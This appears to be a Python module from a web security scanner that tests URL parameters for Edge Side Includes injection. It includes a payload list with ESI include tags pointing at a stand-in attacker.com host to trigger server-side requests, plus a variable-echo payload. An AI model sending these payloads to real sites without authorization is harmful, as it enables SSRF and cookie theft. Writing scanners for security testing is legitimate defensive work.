import asyncio
from modules.core import console

# ESI Injection (Edge Side Includes)
# Vulnerability: Intermediate caches (Varnish, Akamai, Cloudflare) parse XML tags in HTML.
# Attackers inject <esi:include src="..."> to force the edge server to fetch content (SSRF).
# Impact: RCE (if supported), SSRF, Cookie Theft.

ESI_PAYLOADS = [
    "<esi:include src=\"http://attacker.com/test\" />",
    # Detection Payload (Echo)
    # Some ESI engines support arbitrary variable echoing
    "<esi:vars>$(HTTP_HOST)</esi:vars>",
    "<!--esi <esi:include src=\"http://attacker.com/\" /> -->"
]

async def check_esi(session, url, param):
    try:
        for payload in ESI_PAYLOADS:
            target = f"{url}?{param}={payload}"
            if "?" in url: target = f"{url}&{param}={payload}"
            
            async with session.get(target, timeout=5, ssl=False) as resp:
                text = await resp.text()
                
                # Indicators
                # 1. Processing: If the payload disappears but we see result (rare echo)
                # 2. Error: "ESI parsing error" or similar
                # 3. Blind: We rely on checking for specific error messages or successful echo
                
                if "ESI" in text and "error" in text.lower():
                     return {
                        "url": target,
                        "param": param,
                        "type": "ESI Injection (Error)",
                        "evidence": "ESI Error Message Leaked"
                    }
                
                # Check for echo behavior (blind is harder to automate without callback server)
                # We check if the tag *disappears* (parsed) compared to reflection.
                # Heuristic: If we inject <esi:include...> and it is NOT found in response 
                # but "Welcome" or standard page content IS found, it *might* have been stripped/processed.
                # This is weak, so we focus on explicit errors or variable expansion.
                
                if "$(HTTP_HOST)" not in text and payload == "<esi:vars>$(HTTP_HOST)</esi:vars>" and resp.host in text:
                     return {
                        "url": target,
                        "param": param,
                        "type": "ESI Injection (Echo)",
                        "evidence": "ESI Variable Expanded (HTTP_HOST)"
                    }

    except Exception:
        pass
    return None

async def scan_esi(session, url):
    """
    Scan for ESI Injection (Edge Side Includes).
    """
    console.print(f"\n[bold cyan]--- ESI Injection Scanner ---[/bold cyan]")
    
    params = ["q", "search", "id", "url", "ref", "query"]
    
    tasks = [check_esi(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] ESI INJECTION INDICATED: {res['param']}[/bold red]")
             console.print(f"      Type: {res['type']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No ESI injection indicators found.[/dim]")
        
    return found
